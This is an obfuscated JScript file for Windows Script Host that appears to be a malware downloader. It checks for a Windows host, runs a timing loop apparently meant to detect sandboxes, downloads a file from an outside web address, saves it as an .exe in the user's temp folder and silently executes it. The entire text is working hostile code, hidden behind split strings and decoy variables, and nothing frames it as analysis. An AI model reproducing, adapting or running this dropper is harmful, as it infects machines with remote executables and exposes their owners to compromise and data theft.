var _I = false;
var _Z0 = "CreateObject";
var _FP = function _RP() {return WScript[_Z0]("WScript"+".Shell");}(), _F = 11;
var _TW = "MSXML2.XMLHTTP";
var _PE = 2123213;
var _P = 0;
function _A0(_O){_FP["Run"](_O, _P, _P);};
function _M(){return _TW + "";};
function _MS(_P0, _AL){_P = _P * 1; return _P0 - _AL;};
function _K(){return _Z0;};
/*@cc_on
  @if (@_win32 || @_win64)
    _I = true;
  @end
@*/
if (_I)
{
var _SV = "";
function _OD(){return 22;};
var _GH = 0; var _UC = 0;
function _A()
{
var _PT = new this["Date"]();
var _GQ = _PT["getUTCMilliseconds"]();
WScript["Sleep"](_OD());
var _PT = new this["Date"]();
var _AA = _PT["getUTCMilliseconds"]();
WScript["Sleep"](_OD());
var _PT = new this["Date"]();
var _VJ = _PT["getUTCMilliseconds"]();
var _GH = "_D";
_GH = _MS(_AA, _GQ);
var _UC = "_XV";
_UC = _MS(_VJ, _AA);
_SV = "open";
return _MS(_GH, _UC);
}
var _Q = false;
var _W = false;
for (var _J = _P; _J < _OD() * 1; _J++){if (_A() != _P){
_Q = true; 
_UC = "31" + 11 * _GH + _UC; 
_W = true; 
break;
}}
function _FF() {return ((_Q == true) && (_Q == _W)) ? 1 : _P;};
if (_Q && _FF() && _W){
function _SE() {return _FP["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "JHdjk20pqz.ex" + "e";};
 _CR = _M();
 _L = WScript[_Z0](_CR);
 var _LO = 1;
 while (_LO){
try {
	if (_LO == 1)
	{
		_L[_SV]("GET", "http://dev.orolatina.com/s3isk", false);
		_L["send"]();
		_MO = "Sleep";
	}
	WScript[_MO](_OD() + 120); 
	if (_L["readystate"] < 2 * 2) continue;
	_LO = _P;
	function _Z(_G) {var _T = (1, 2, 3, 4, 5, _G); return _T;};
	_KE = WScript[_K()]("ADODB.Stream");
	_CR = _KE;
	_CR[_SV]();
	_CR["type"] = _Z(1);
	_CR["write"](_L["ResponseBody"]);
	_KE["position"] = _Z(_P);
	_CR["Save" + "ToFile"](_SE(), 2);
	_KE["cl"+"ose"]();
	_DG = _SE();
	_A0(_DG);
} catch(_G0){};
}
}
}

